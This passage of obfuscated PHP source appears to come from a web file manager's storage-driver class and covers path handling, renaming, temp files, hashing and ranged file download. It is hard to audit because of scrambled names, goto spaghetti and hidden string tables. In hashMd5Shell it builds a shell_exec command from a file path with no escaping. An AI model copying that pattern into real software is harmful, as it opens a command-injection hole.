$AÂ‡ÂÆ∞´å[$C‚ªÌåÇŒŒ . $f£›Œ®¡ƒÔ[66] . $FŸﬂ∆ãπâÓ . $f£›Œ®¡ƒÔ[67] . $céóˆ¢êéÍ] = $c¶ﬂ©Íìò‡; $AÂ‡ÂÆ∞´å[$FŸﬂ∆ãπâÓ . $f£›Œ®¡ƒÔ[66] . $C‚ªÌåÇŒŒ . $f£›Œ®¡ƒÔ[67] . $céóˆ¢êéÍ] = $céóˆ¢êéÍ; goto E≠©„è§àà; féº‚ÿç°⁄: $Eÿõèÿª’£ = $FŸﬂ∆ãπâÓ . $f£›Œ®¡ƒÔ[66] . $C‚ªÌåÇŒŒ . $f£›Œ®¡ƒÔ[67] . $c¶ﬂ©Íìò‡; if (isset($AÂ‡ÂÆ∞´å[$Eÿõèÿª’£])) { return $AÂ‡ÂÆ∞´å[$Eÿõèÿª’£]; } if (function_exists($f£›Œ®¡ƒÔ[68])) { $céóˆ¢êéÍ = @mb_convert_encoding($c¶ﬂ©Íìò‡, $C‚ªÌåÇŒŒ, $FŸﬂ∆ãπâÓ); } else { $céóˆ¢êéÍ = @iconv($FŸﬂ∆ãπâÓ, $C‚ªÌåÇŒŒ, $c¶ﬂ©Íìò‡); } goto FÖÓ“â‹·Ü; b≥ €≥¬„ã: } public function getPathInner($Bñ÷πÚÔï—) { $f∂±‰€´¨€ = IO::init($Bñ÷πÚÔï—); return $f∂±‰€´¨€->path; } public function getPathOuter($Aõ¥ìÉùÙä) { $aÌœÜ≠§¨÷ =& $_SERVER[¯èãÄπµ]; $bÔîã¢ï”Ê = strlen(trim($this->pathBase, $aÌœÜ≠§¨÷[8])); $Aõ¥ìÉùÙä = substr(trim($Aõ¥ìÉùÙä, $aÌœÜ≠§¨÷[8]), $bÔîã¢ï”Ê); return $this->pathDriver . $aÌœÜ≠§¨÷[8] . ltrim($Aõ¥ìÉùÙä, $aÌœÜ≠§¨÷[8]); } public function isParentOf($eèŸ–≥Ç …, $EçàæÕÑÈä) { $eÍ—ë©†óæ =& $_SERVER[¯èãÄπµ]; $eèŸ–≥Ç … = rtrim(strtolower($eèŸ–≥Ç …), $eÍ—ë©†óæ[8]) . $eÍ—ë©†óæ[8]; $EçàæÕÑÈä = rtrim(strtolower($EçàæÕÑÈä), $eÍ—ë©†óæ[8]) . $eÍ—ë©†óæ[8]; $dÊî≠Ûã£ª = strpos($EçàæÕÑÈä, $eèŸ–≥Ç …) === 0; return $dÊî≠Ûã£ª; } public function getType() { $E·ÂÉØéÍ¨ =& $_SERVER[¯èãÄπµ]; $CØ‡’æ∆’à = str_replace($E·ÂÉØéÍ¨[71], $E·ÂÉØéÍ¨[33], get_class($this)); return strtolower($CØ‡’æ∆’à); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($BòÕêû≠¥ß, $e∑–ª……èŒ) { $b°¿¯˘»Ç† =& $_SERVER[¯èãÄπµ]; $BÍ‡’Ößëï = rtrim($BòÕêû≠¥ß, $b°¿¯˘»Ç†[8]) . $b°¿¯˘»Ç†[8] . $e∑–ª……èŒ; $a—ëÂ§ªÕØ = $this->exist($BÍ‡’Ößëï); return $a—ëÂ§ªÕØ ? $BÍ‡’Ößëï : !1; } public function renameObject($D‘ÒÎ∞˜ÜÈ, $aµ˜Üùàì±) { goto DÑè»ÂŸ’è; f¨¨Î∑™ú•: return $EÁÀ¨òê∑ˆ ? $aµ˜Üùàì± : !1; goto B—Ÿü…«·®; BÕ¿ÇØÙœ: $D‘ÒÎ∞˜ÜÈ = $this->getPathOuter($D‘ÒÎ∞˜ÜÈ); $aµ˜Üùàì± = $this->pathFather($D‘ÒÎ∞˜ÜÈ) . $aµ˜Üùàì±; if (IO::isFile($D‘ÒÎ∞˜ÜÈ)) { $EÁÀ¨òê∑ˆ = IO::copy($D‘ÒÎ∞˜ÜÈ, $this->pathFather($D‘ÒÎ∞˜ÜÈ), REPEAT_RENAME_FOLDER, $CîÀØßÁíÍ); if ($EÁÀ¨òê∑ˆ) { IO::remove($D‘ÒÎ∞˜ÜÈ); } } else { $EÁÀ¨òê∑ˆ = IO::mkdir($aµ˜Üùàì±); if (!$EÁÀ¨òê∑ˆ) { return !1; } $DÎôÖåä«≤ = IO::listPath($D‘ÒÎ∞˜ÜÈ, !0); $d£∂…ÔÇ¥Œ = array_merge($DÎôÖåä«≤[$dÙ—ç´’ı‰[73]], $DÎôÖåä«≤[$dÙ—ç´’ı‰[74]]); foreach ($d£∂…ÔÇ¥Œ as $eıÔêÈÒ§ã) { IO::move($eıÔêÈÒ§ã[$dÙ—ç´’ı‰[75]], $aµ˜Üùàì±, REPEAT_RENAME_FOLDER); } IO::remove($D‘ÒÎ∞˜ÜÈ); } goto f¨¨Î∑™ú•; DÑè»ÂŸ’è: $dÙ—ç´’ı‰ =& $_SERVER[¯èãÄπµ]; $CîÀØßÁíÍ = $aµ˜Üùàì±; Hook::trigger($dÙ—ç´’ı‰[72], $this, $D‘ÒÎ∞˜ÜÈ, $this, $this->pathFather($D‘ÒÎ∞˜ÜÈ) . $aµ˜Üùàì±); goto BÕ¿ÇØÙœ; B—Ÿü…«·®: } public function tempFile($cÙ¡˘¶âÃø = '', $B∆É·”πÇ€ = '') { goto fßÇˆ¬¶¯Ë; dî≈»ºŒ‘‚: return $fç’ÇÊ©≈≠; goto bÏÔ“€‹”Ø; bÿø˘îà‹à: $fç’ÇÊ©≈≠ = $fçÁ›…ÂÇ . $cÙ¡˘¶âÃø; @touch($fç’ÇÊ©≈≠); if ($B∆É·”πÇ€) { file_put_contents($fç’ÇÊ©≈≠, $B∆É·”πÇ€); } goto dî≈»ºŒ‘‚; fßÇˆ¬¶¯Ë: if (!$cÙ¡˘¶âÃø) { $cÙ¡˘¶âÃø = rand_string(15); } $fçÁ›…ÂÇ = TEMP_FILES . rand_string(15) . $_SERVER[¯èãÄπµ][8]; @mkdir($fçÁ›…ÂÇ, 511, !0); goto bÿø˘îà‹à; bÏÔ“€‹”Ø: } public function tempFileRemve($dΩœçÔ∞ã£) { @unlink($dΩœçÔ∞ã£); @rmdir($this->pathFather($dΩœçÔ∞ã£)); } public function mkfile($AÊé—òõìñ, $dÀ¨¢œı¿Ë = '', $FÍ˘Ò£ÌòÇ = REPEAT_RENAME) { } public function mkdir($a¬†◊ç‰Í≈, $e¬≤±®›≤ø = REPEAT_SKIP) { } public function copyFile($A®çäß≤Ω“, $Aôï¶ﬁ÷—⁄) { } public function moveFile($B„Ö–èπ˜å, $Dœ¨ëß·Ù…) { } public function remove($BŒ˜âƒãÉÍ) { if ($this->isFile($BŒ˜âƒãÉÍ)) { return $this->delFile($BŒ˜âƒãÉÍ); } return $this->delFolder($BŒ˜âƒãÉÍ); } public function rename($E§í«¡ü´¢, $FË°∂ù›à´) { } public function exist($fåäå⁄≤◊ã) { } public function findByHash($dó†¯«òÎ = '', $Bπ “ﬂÂ™Õ = '') { return !1; } public function isFile($aó√∞«µûÁ) { } public function isFolder($BÆˆÊÉﬁà·) { } public function size($a”Ê•“◊∂ÿ) { } public function info($e≠ÑÒÍüìä) { } public function infoSimple($f†ïê⁄ÒÙè) { return $this->info($f†ïê⁄ÒÙè); } public function infoAuth($f÷î∏ÛÆ¶≤) { return $this->info($f÷î∏ÛÆ¶≤); } public function infoFull($dù…”êﬁõ™) { return $this->info($dù…”êﬁõ™); } public function infoWithChildren($b»„òûÙ©ê) { $bêÈ˜†Ë“Ò =& $_SERVER[¯èãÄπµ]; $fŒÖØ‚Üºü = $this->info($b»„òûÙ©ê); if ($fŒÖØ‚Üºü && $fŒÖØ‚Üºü[$bêÈ˜†Ë“Ò[29]] == $bêÈ˜†Ë“Ò[76]) { $Eöâ”ò‹ñó = array($bêÈ˜†Ë“Ò[77] => 0, $bêÈ˜†Ë“Ò[78] => 0, $bêÈ˜†Ë“Ò[79] => 0); $this->infoChildren($b»„òûÙ©ê, $Eöâ”ò‹ñó); $fŒÖØ‚Üºü[$bêÈ˜†Ë“Ò[77]] = $Eöâ”ò‹ñó[$bêÈ˜†Ë“Ò[77]]; $fŒÖØ‚Üºü[$bêÈ˜†Ë“Ò[80]] = array($bêÈ˜†Ë“Ò[81] => $Eöâ”ò‹ñó[$bêÈ˜†Ë“Ò[78]], $bêÈ˜†Ë“Ò[82] => $Eöâ”ò‹ñó[$bêÈ˜†Ë“Ò[79]]); } return $fŒÖØ‚Üºü; } public function listPath($eó†å∏±¿€, $D¬ôÏ≤È÷‚ = false) { } public function has($d»éºÚ÷®ø, $cÈ¥Ìéÿ·® = false, $d†—ÎâÀÔ© = false) { } public function canRead($F‹“ı∆§¥É) { } public function canWrite($c∏Ëàƒöúè) { } public function getContent($F‹»◊Íø√œ) { } public function setContent($e«…Ç†œ–ì, $D°ÎÙÑ‘Ã“ = '') { } protected function infoChildren($BÆ∆∏Ì¶“¢, &$eÙˆ¥ö÷Ê∫) { $Cç≈ŸÇ’Œ€ =& $_SERVER[¯èãÄπµ]; check_abort(); $a◊“‰≠∑ò‹ = $this->listPath($BÆ∆∏Ì¶“¢, !0); $a◊“‰≠∑ò‹ = array_merge($a◊“‰≠∑ò‹[$Cç≈ŸÇ’Œ€[74]], $a◊“‰≠∑ò‹[$Cç≈ŸÇ’Œ€[73]]); foreach ($a◊“‰≠∑ò‹ as $aÙÖäóàØ≈) { if ($aÙÖäóàØ≈[$Cç≈ŸÇ’Œ€[29]] == $Cç≈ŸÇ’Œ€[76]) { $eÙˆ¥ö÷Ê∫[$Cç≈ŸÇ’Œ€[79]]++; $bèãúë∫∫ = $this->getPathInner($aÙÖäóàØ≈[$Cç≈ŸÇ’Œ€[75]]); $this->infoChildren($bèãúë∫∫, $eÙˆ¥ö÷Ê∫); } else { $eÙˆ¥ö÷Ê∫[$Cç≈ŸÇ’Œ€[78]]++; $eÙˆ¥ö÷Ê∫[$Cç≈ŸÇ’Œ€[77]] += $aÙÖäóàØ≈[$Cç≈ŸÇ’Œ€[77]]; } } } public function fileSubstr($BÎ…õÎ™ò‡, $bÑäçÛÌøŸ, $e◊˘ÉÑÔ‡â) { } public function listAll($B¯ﬁôç–ç√) { } public function upload($eŸŒŒÿâ·œ, $Bõªõ¶†Óß, $bÜöÉ∏â‡∑ = false, $e¶≤îÿñº© = REPEAT_REPLACE) { } public function uploadFileByID($fπáÇ¬∂ô¥, $BäÂ∫¨ºÓ, $Bä›ˆÉ»√·) { } public function uploadFileByPath($f†º∑≤à¥Ë, $cÌ´·àßüõ, $AÏ˘ãàöÜø = array()) { } public function isUploadServer() { $Aöâöèåﬂ’ =& $_SERVER[¯èãÄπµ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Aöâöèåﬂ’[83]) { return !0; } return $GLOBALS[$Aöâöèåﬂ’[6]][$Aöâöèåﬂ’[84]][$Aöâöèåﬂ’[85]]; } public function isFileOutServer() { $dñ‚ê’íîﬁ =& $_SERVER[¯èãÄπµ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $dñ‚ê’íîﬁ[83]) { return !0; } return $GLOBALS[$dñ‚ê’íîﬁ[6]][$dñ‚ê’íîﬁ[84]][$dñ‚ê’íîﬁ[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($bÏ–’†‡Ç«) { $bπ„ô…‘óÔ =& $_SERVER[¯èãÄπµ]; if (!$this->isCdnHost()) { return $bÏ–’†‡Ç«; } return str_replace(trim(get_url_root($bÏ–’†‡Ç«), $bπ„ô…‘óÔ[8]), trim($this->cdnHost, $bπ„ô…‘óÔ[8]), $bÏ–’†‡Ç«); } public function uploadLink($aà£Ω ø∆å, $Aﬂ°Ü∞ıÑ⁄ = 0) { goto C±ª∆èΩúÍ; a §∂ä“âπ: if (!in_array($aê∂°∂ƒÇË, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $a”ıêÂ‡·ﬂ = 1024 * 1024 * 10; goto AÉ´¨Í’üä; eÏ‡Ñ©Ÿ‘ô: if ($cŸ∏¡œî«Ü) { $cŸ∏¡œî«Ü[$E§Ëìîö¢¡[89]] = $aà£Ω ø∆å; $cŸ∏¡œî«Ü[$E§Ëìîö¢¡[90]] = $aê∂°∂ƒÇË; } return $cŸ∏¡œî«Ü; goto d√∞¶õöΩÀ; AÉ´¨Í’üä: $Bá≥ïú˜ó¯ = $Aﬂ°Ü∞ıÑ⁄ <= $a”ıêÂ‡·ﬂ ? $E§Ëìîö¢¡[87] : $E§Ëìîö¢¡[88]; $BÉ«ì √Ô· = (!$Aﬂ°Ü∞ıÑ⁄ ? 1 : ceil($Aﬂ°Ü∞ıÑ⁄ / pow(1024, 3))) * 3600 * 4; $cŸ∏¡œî«Ü = $this->{$Bá≥ïú˜ó¯}($aà£Ω ø∆å, $BÉ«ì √Ô·); goto eÏ‡Ñ©Ÿ‘ô; C±ª∆èΩúÍ: $E§Ëìîö¢¡ =& $_SERVER[¯èãÄπµ]; if ($this->isUploadServer()) { return; } $aê∂°∂ƒÇË = $this->getType(); goto a §∂ä“âπ; d√∞¶õöΩÀ: } public function uploadFormData($füÆ®‹Óå¬, $BåÕÁû˜´ò = 3600) { } public function multiUploadFormData($A∫”Ù·¥ˆ, $bÙ„≥ë≠Ú∫ = 3600) { } public function download($fâãÃÑ…õﬂ, $dΩ ßÕÂﬂÒ) { } public function ext($Dú∞â¡⁄üê) { $dä÷—ı¢ºµ =& $_SERVER[¯èãÄπµ]; if (strpos($Dú∞â¡⁄üê, $dä÷—ı¢ºµ[8]) === -1) { $bñ§Òô®ﬁÉ = $Dú∞â¡⁄üê; } else { $bñ§Òô®ﬁÉ = $this->pathThis($Dú∞â¡⁄üê); } $B≈£éòñÔÖ = $dä÷—ı¢ºµ[33]; if (strstr($bñ§Òô®ﬁÉ, $dä÷—ı¢ºµ[91])) { $B≈£éòñÔÖ = substr($bñ§Òô®ﬁÉ, strrpos($bñ§Òô®ﬁÉ, $dä÷—ı¢ºµ[91]) + 1); $B≈£éòñÔÖ = strtolower($B≈£éòñÔÖ); } if (strlen($B≈£éòñÔÖ) > 3 && preg_match($dä÷—ı¢ºµ[92], $B≈£éòñÔÖ, $b‰≠çŒ“≤µ)) { $B≈£éòñÔÖ = $dä÷—ı¢ºµ[33]; } return $B≈£éòñÔÖ; } public function pathThis($Dòß∆≤Ω∆∫) { $bÖåŸ‹ëäπ =& $_SERVER[¯èãÄπµ]; $Dòß∆≤Ω∆∫ = str_replace($bÖåŸ‹ëäπ[93], $bÖåŸ‹ëäπ[8], rtrim($Dòß∆≤Ω∆∫, $bÖåŸ‹ëäπ[8])); $b–ç«ƒ÷ƒ˜ = strrpos($Dòß∆≤Ω∆∫, $bÖåŸ‹ëäπ[8]); if ($b–ç«ƒ÷ƒ˜ === !1) { return $Dòß∆≤Ω∆∫; } return substr($Dòß∆≤Ω∆∫, $b–ç«ƒ÷ƒ˜ + 1); } public function pathFather($eØ◊√ˆò≤†) { $DÃ¶“Œ≠ÇÁ =& $_SERVER[¯èãÄπµ]; $eØ◊√ˆò≤† = str_replace($DÃ¶“Œ≠ÇÁ[93], $DÃ¶“Œ≠ÇÁ[8], rtrim($eØ◊√ˆò≤†, $DÃ¶“Œ≠ÇÁ[8])); $BÍπ·ÏµçÓ = strrpos($eØ◊√ˆò≤†, $DÃ¶“Œ≠ÇÁ[8]); if ($BÍπ·ÏµçÓ === !1) { return $DÃ¶“Œ≠ÇÁ[33]; } return substr($eØ◊√ˆò≤†, 0, $BÍπ·ÏµçÓ + 1); } public function hashSimple($d´Ï€ﬂüìÕ) { goto EêÜé≈»¿ü; dÃüì‰Íóã: $C◊≥ç®‘‡Ì = intval($e“πáÚÉÀà / $D…Ùáõò ); $E°≠ı©‰ÖÁ = $dÆÖıÌí’–[33]; for ($AÏäêíÏ≤¬ = 0; $AÏäêíÏ≤¬ < $D…Ùáõò ; $AÏäêíÏ≤¬++) { $E°≠ı©‰ÖÁ .= $this->fileSubstr($d´Ï€ﬂüìÕ, $C◊≥ç®‘‡Ì * $AÏäêíÏ≤¬, $dà÷ÜÆËÎÍ); } goto Dö◊ƒÆ‹∏ﬁ; a¡æ†Øûèÿ: $dà÷ÜÆËÎÍ = 200; $D…Ùáõò  = 50; if ($e“πáÚÉÀà <= $dà÷ÜÆËÎÍ * $D…Ùáõò ) { return $this->hashMd5($d´Ï€ﬂüìÕ) . $e“πáÚÉÀà; } goto dÃüì‰Íóã; EêÜé≈»¿ü: $dÆÖıÌí’– =& $_SERVER[¯èãÄπµ]; if (!$d´Ï€ﬂüìÕ) { return md5($dÆÖıÌí’–[33]); } $e“πáÚÉÀà = $this->size($d´Ï€ﬂüìÕ); goto a¡æ†Øûèÿ; Dö◊ƒÆ‹∏ﬁ: $E°≠ı©‰ÖÁ .= $this->fileSubstr($d´Ï€ﬂüìÕ, $e“πáÚÉÀà - $dà÷ÜÆËÎÍ, $dà÷ÜÆËÎÍ); return md5($E°≠ı©‰ÖÁ) . $e“πáÚÉÀà; goto bÁ¨õºîÒß; bÁ¨õºîÒß: } public static $md5Cache = array(); public function hashMd5($CÊõìò“ª·) { $CÊõìò“ª· = $this->iconvSystem($CÊõìò“ª·); if (isset(self::$md5Cache[$CÊõìò“ª·])) { return self::$md5Cache[$CÊõìò“ª·]; } self::$md5Cache[$CÊõìò“ª·] = $this->hashMd5Shell($CÊõìò“ª·); if (!self::$md5Cache[$CÊõìò“ª·]) { self::$md5Cache[$CÊõìò“ª·] = @md5_file($CÊõìò“ª·); } return self::$md5Cache[$CÊõìò“ª·]; } private function hashMd5Shell($c≠¬Â»ÎÀº) { goto B›åØ”´°è; B›åØ”´°è: $Eª¥‘Üî¿æ =& $_SERVER[¯èãÄπµ]; if (!function_exists($Eª¥‘Üî¿æ[94])) { return !1; } $C∏Ê°“¬ÍΩ = array($Eª¥‘Üî¿æ[95], $Eª¥‘Üî¿æ[96]); goto f·≥°–Œ≈—; F„ õˆÜìÀ: $E—À»ûÜïã = shell_exec($E¬Ù âÁ≤ä . "\40\42{$c≠¬Â»ÎÀº}\42"); return substr($E—À»ûÜïã, 0, 32); goto CÑÃ‰ìØ¿Í; f·≥°–Œ≈—: $E¬Ù âÁ≤ä = Cache::get($Eª¥‘Üî¿æ[97]); if (!$E¬Ù âÁ≤ä) { $a∂¯…¬µ≈” = BASIC_PATH . $Eª¥‘Üî¿æ[98]; $cÖ¬œ–†üÕ = md5_file($a∂¯…¬µ≈”); $E¬Ù âÁ≤ä = $Eª¥‘Üî¿æ[99]; foreach ($C∏Ê°“¬ÍΩ as $b¿ıÀﬂÆÂ¢) { $E—À»ûÜïã = shell_exec($b¿ıÀﬂÆÂ¢ . "\40\x22{$a∂¯…¬µ≈”}\x22"); if ($E—À»ûÜïã && substr(trim($E—À»ûÜïã), 0, 32) == $cÖ¬œ–†üÕ) { $E¬Ù âÁ≤ä = $b¿ıÀﬂÆÂ¢; break; } } Cache::set($Eª¥‘Üî¿æ[97], $E¬Ù âÁ≤ä, 3600); } if ($E¬Ù âÁ≤ä == $Eª¥‘Üî¿æ[99]) { return !1; } goto F„ õˆÜìÀ; CÑÃ‰ìØ¿Í: } public function link($FøöÚï‹Ç©) { return $FøöÚï‹Ç©; } public function fileOut($e…Ñó§€âô, $AçÇ∆õ‹∂™ = false, $Bè¯ù™Àƒü = false, $Dê¡°ö€ = '') { goto aÕÇæãî–…; aÕÇæãî–…: $A≤«Î ó‚Ÿ =& $_SERVER[¯èãÄπµ]; $this->cacheMethod(null, null); if (!$e…Ñó§€âô || !$this->exist($e…Ñó§€âô)) { show_json(LNG($A≤«Î ó‚Ÿ[100]), !1, $Bè¯ù™Àƒü); } goto B‘§¨µáÚ…; C„°‹ì«Æ¢: @ob_end_clean(); set_timeout(); $fÜÂõë‘Ë = $this->infoFull($e…Ñó§€âô); goto bÉªíÜ‰´÷; AÌ·ØéΩﬂÿ: if (isset($_SERVER[$A≤«Î ó‚Ÿ[127]]) && strtotime($_SERVER[$A≤«Î ó‚Ÿ[127]]) == $fÜÂõë‘Ë[$A≤«Î ó‚Ÿ[106]]) { header($A≤«Î ó‚Ÿ[128], !0, 304); die; } if (isset($_SERVER[$A≤«Î ó‚Ÿ[129]]) && $_SERVER[$A≤«Î ó‚Ÿ[129]] == $Dê¡°ö€) { header($A≤«Î ó‚Ÿ[130] . $Dê¡°ö€, !0, 304); die; } header($A≤«Î ó‚Ÿ[130] . $Dê¡°ö€); goto a¡ÿÆŒÜùÓ; b±›≠ı˜§Ñ: $bè¢∆‡Á–æ = get_file_mime($Déïéí‹«ß); if (strstr($bè¢∆‡Á–æ, $A≤«Î ó‚Ÿ[113])) { $bè¢∆‡Á–æ = $bè¢∆‡Á–æ . $A≤«Î ó‚Ÿ[114]; } if ($AçÇ∆õ‹∂™ === !1 && !mime_support($bè¢∆‡Á–æ)) { $AçÇ∆õ‹∂™ = !0; $bè¢∆‡Á–æ = $A≤«Î ó‚Ÿ[115]; } goto CπÿÖ«‚™›; C√ü≠¨ñâÁ: header($A≤«Î ó‚Ÿ[120]); header($A≤«Î ó‚Ÿ[121] . $bè¢∆‡Á–æ); header($A≤«Î ó‚Ÿ[122] . gmdate($A≤«Î ó‚Ÿ[105], time() + 3600 * 24 * 30) . $A≤«Î ó‚Ÿ[123]); goto eî°í◊Îı†; a¡ÿÆŒÜùÓ: header($A≤«Î ó‚Ÿ[131] . $E¥©ﬁ•Áêç . $A≤«Î ó‚Ÿ[123]); header($A≤«Î ó‚Ÿ[132] . $f‰∑∞ªÓıÙ); header($A≤«Î ó‚Ÿ[133]); goto f⁄ì·ÿÃ√Ø; B‘§¨µáÚ…: $dÚ’æﬂ ·‡ = $this->getType() == $A≤«Î ó‚Ÿ[101]; $Fç÷‰ã©Ù… = $GLOBALS[$A≤«Î ó‚Ÿ[6]][$A≤«Î ó‚Ÿ[84]][$A≤«Î ó‚Ÿ[102]][$A≤«Î ó‚Ÿ[103]]; $F°ñø«ê÷â = (double) $GLOBALS[$A≤«Î ó‚Ÿ[6]][$A≤«Î ó‚Ÿ[84]][$A≤«Î ó‚Ÿ[102]][$A≤«Î ó‚Ÿ[104]] * 1024 * 1024; goto C„°‹ì«Æ¢; eî°í◊Îı†: header($A≤«Î ó‚Ÿ[124]); header($A≤«Î ó‚Ÿ[125]); header($A≤«Î ó‚Ÿ[126]); goto AÌ·ØéΩﬂÿ; DáÀ“êàû: header($A≤«Î ó‚Ÿ[149] . ($fç˘Éß¬≠å - $b«Û‰”Ñ¿¬ + 1)); if ($_SERVER[$A≤«Î ó‚Ÿ[150]] == $A≤«Î ó‚Ÿ[151]) { return; } $Fá≤∫ê∫¢› = 1024 * 100; goto b¬Ô‡∞˜ñê; f⁄ì·ÿÃ√Ø: header($A≤«Î ó‚Ÿ[134] . $bË’‚ï«Øï); header($A≤«Î ó‚Ÿ[135]); if (!$AçÇ∆õ‹∂™ && $Déïéí‹«ß == $A≤«Î ó‚Ÿ[136]) { if ($bË’‚ï«Øï > 1024 * 1024 * 5) { die; } $FÚ≤¿Óç≤  = $this->getContent($e…Ñó§€âô); $FÚ≤¿Óç≤  = Html::clearSVG($FÚ≤¿Óç≤ ); echo $FÚ≤¿Óç≤ ; die; } goto F∆Îßò“ì∫; CπÿÖ«‚™›: $c⁄ö÷ËπÉ  = rawurlencode($f‰∑∞ªÓıÙ); $c⁄ö÷ËπÉ  = $A≤«Î ó‚Ÿ[112] . $c⁄ö÷ËπÉ  . $A≤«Î ó‚Ÿ[116] . $c⁄ö÷ËπÉ ; if ($AçÇ∆õ‹∂™) { header($A≤«Î ó‚Ÿ[117]); header($A≤«Î ó‚Ÿ[118] . $c⁄ö÷ËπÉ ); } else { header($A≤«Î ó‚Ÿ[119] . $c⁄ö÷ËπÉ ); } goto C√ü≠¨ñâÁ; F∆Îßò“ì∫: $d∆”Ë›óñÛ = strtolower($_SERVER[$A≤«Î ó‚Ÿ[137]]); if ($dÚ’æﬂ ·‡ && $d∆”Ë›óñÛ && $Fç÷‰ã©Ù…) { if (strstr($d∆”Ë›óñÛ, $A≤«Î ó‚Ÿ[138])) { header($A≤«Î ó‚Ÿ[139] . $e…Ñó§€âô); } else { if (strstr($d∆”Ë›óñÛ, $A≤«Î ó‚Ÿ[140])) { header($A≤«Î ó‚Ÿ[141] . $e…Ñó§€âô); } else { if (strstr($d∆”Ë›óñÛ, $A≤«Î ó‚Ÿ[142])) { header($A≤«Î ó‚Ÿ[143] . $e…Ñó§€âô); } } } if ($F°ñø«ê÷â) { header($A≤«Î ó‚Ÿ[144] . $F°ñø«ê÷â); } return; } if (isset($_SERVER[$A≤«Î ó‚Ÿ[145]])) { if (preg_match($A≤«Î ó‚Ÿ[146], $_SERVER[$A≤«Î ó‚Ÿ[145]], $D≤»Ö®»ß“)) { $b«Û‰”Ñ¿¬ = intval($D≤»Ö®»ß“[1]); if (!empty($D≤»Ö®»ß“[2])) { $fç˘Éß¬≠å = intval($D≤»Ö®»ß“[2]); } } header($A≤«Î ó‚Ÿ[147]); header("\x43\157\x6e\164\145\x6e\x74\x2d\122\x61\x6e\147\x65\72\x20\x62\171\164\x65\163\40{$b«Û‰”Ñ¿¬}\55{$fç˘Éß¬≠å}\57" . $bË’‚ï«Øï); } else { header($A≤«Î ó‚Ÿ[148]); } goto DáÀ“êàû; CáÙ•∑…Ê”: $b«Û‰”Ñ¿¬ = 0; $fç˘Éß¬≠å = $bË’‚ï«Øï - 1; $Déïéí‹«ß = $this->ext($f‰∑∞ªÓıÙ); goto bç»à†è˘À; bç»à†è˘À: if (in_array($Déïéí‹«ß, array($A≤«Î ó‚Ÿ[107], $A≤«Î ó‚Ÿ[108], $A≤«Î ó‚Ÿ[109], $A≤«Î ó‚Ÿ[110]))) { $Déïéí‹«ß = $A≤«Î ó‚Ÿ[111]; } if (!$Dê¡°ö€) { $Dê¡°ö€ = md5($E¥©ﬁ•Áêç . $this->hashSimple($e…Ñó§€âô)); } $Dê¡°ö€ = $A≤«Î ó‚Ÿ[112] . $Dê¡°ö€ . $A≤«Î ó‚Ÿ[112]; goto b±›≠ı˜§Ñ; bÉªíÜ‰´÷: $bË’‚ï«Øï = $fÜÂõë‘Ë[$A≤«Î ó‚Ÿ[77]]; $E¥©ﬁ•Áêç = gmdate($A≤«Î ó‚Ÿ[105], $fÜÂõë‘Ë[$A≤«Î ó‚Ÿ[106]]); $f‰∑∞ªÓıÙ = $Bè¯ù™Àƒü ? $Bè¯ù™Àƒü : $this->iconvApp($fÜÂõë‘Ë[$A≤«Î ó‚Ÿ[28]]); goto CáÙ•∑…Ê”; b¬Ô‡∞˜ñê: $EáÚıª¢è™ = 0; if ($F°ñø«ê÷â) { $EáÚıª¢è™ = intval(1000 * 1000 * ($Fá≤∫ê∫¢› / $F°ñø«ê÷â)); } while ($b«Û‰”Ñ¿¬ <= $fç˘Éß¬≠å) { $EÁê·ÿê€ = timeFloat(); check_abort(); $eöÜÌûèéŸ = $fç˘Éß¬≠å - $b«Û‰”Ñ¿¬ + 1; if ($eöÜÌûèéŸ <= $Fá≤∫ê∫¢›) { $Fá≤∫ê∫¢› = $eöÜÌûèéŸ; } echo $this->fileSubstr($e…Ñó§€âô, $b«Û‰”Ñ¿¬, $Fá≤∫ê∫¢›); $b«Û‰”Ñ¿¬ += $Fá≤∫ê∫¢›; if ($Fá≤∫ê∫¢› == $eöÜÌûèéŸ) { $b«Û‰”Ñ¿¬ = $fç˘Éß¬≠å + 1; } if ($EáÚıª¢è™) { $aà–Ëà¡‚Æ = intval(1000 * 1000 * (timeFloat() - $EÁê·ÿê€)); $DÚﬁÖ¯†…à = $EáÚıª¢è™ - $aà–Ëà¡‚Æ; if ($DÚﬁÖ¯†…à > 5) { usleep($DÚﬁÖ¯†…à); } } } goto D∏¨úôÈÉÁ; D∏¨úôÈÉÁ: } public function fileOutServer($c†ÂÏÌ≥‹ô, $AíôÃüïëÈ = false, $a‹◊ÙãÔáÑ = false, $EÑã¡◊ñ⁄Ù = '') { $this->fileOut($c†ÂÏÌ≥‹ô, $AíôÃüïëÈ, $a‹◊ÙãÔáÑ, $EÑã¡◊ñ⁄Ù); } public function fileOutLink($Cóî∞ªãèﬁ) { header($_SERVER[¯èãÄπµ][152] . $Cóî∞ªãèﬁ); die; } public function cacheMethod($Aÿøà∏ïÍç, $FÇÈ¿äÍ“–) { goto b¨•†ªÀÔá; e©«ì∆÷õ: if (!is_null($A‰î°π⁄éÓ)) { return $A‰î°π⁄éÓ; } $A‰î°π⁄éÓ = $this->{$Aÿøà∏ïÍç}($FÇÈ¿äÍ“–); $a‡Ë√—ËÇØ[$b∫ÑÖı¥èﬂ] = $A‰î°π⁄éÓ; goto d≠ãÂàà¶Ï; d⁄œúõç«ê: if (is_null($Aÿøà∏ïÍç)) { $a‡Ë√—ËÇØ = array(); return; } if (is_null($FÇÈ¿äÍ“–)) { unset($a‡Ë√—ËÇØ[$b∫ÑÖı¥èﬂ]); return; } $A‰î°π⁄éÓ = isset($a‡Ë√—ËÇØ[$b∫ÑÖı¥èﬂ]) ? $a‡Ë√—ËÇØ[$b∫ÑÖı¥èﬂ] : null; goto e©«ì∆÷õ; b¨•†ªÀÔá: $fÎÿ≤«èœà =& $_SERVER[¯èãÄπµ]; static $a‡Ë√—ËÇØ = array(); $b∫ÑÖı¥èﬂ = $fÎÿ≤«èœà[153] . $Aÿøà∏ïÍç . $fÎÿ≤«èœà[154] . rtrim($FÇÈ¿äÍ“–, $fÎÿ≤«èœà[8]); goto d⁄œúõç«ê; d≠ãÂàà¶Ï: return $A‰î°π⁄éÓ; goto B≠íÑµ≠ãõ; B≠íÑµ≠ãõ: } public function fileOutImage($Dø∞«∑≤Î, $f™«ﬁ©ô∆· = 